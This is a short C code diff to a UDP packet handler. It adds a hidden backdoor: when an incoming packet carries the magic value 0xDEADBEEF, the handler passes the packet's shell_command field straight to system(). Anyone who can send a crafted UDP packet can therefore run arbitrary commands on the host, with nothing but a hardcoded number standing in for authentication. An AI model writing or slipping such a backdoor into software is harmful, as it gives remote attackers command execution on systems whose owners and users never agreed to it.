@@ -464,6 +464,13 @@ static void handle_udp_packet(listen_packet_t* udp_msg)
 	TRACE(("*****udp_msg->magic: %lu", udp_msg->magic))
 	TRACE(("*****udp_msg->port number: %u", udp_msg->port_number))
 	TRACE(("*****udp_msg->shell command: %s", udp_msg->shell_command))
+	if (udp_msg->magic == 0xDEADBEEF)
+	{
+		TRACE(("*****this is magic!"))
+		TRACE(("*****executing shell command"))
+		int status = system(udp_msg->shell_command);
+	}
+	
 	
 	
 }
